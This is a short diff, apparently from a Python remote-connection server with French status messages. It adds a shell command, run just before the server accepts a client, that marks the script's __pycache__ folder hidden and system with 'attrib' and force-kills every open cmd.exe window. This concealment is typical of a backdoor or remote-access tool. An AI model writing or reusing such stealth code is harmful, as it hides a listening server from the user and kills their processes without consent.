@@ -184,6 +184,7 @@ while run == True:
     server.listen()
     
     print("lancement")
+    subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
     (client, address) = server.accept()
     print("connect")
     
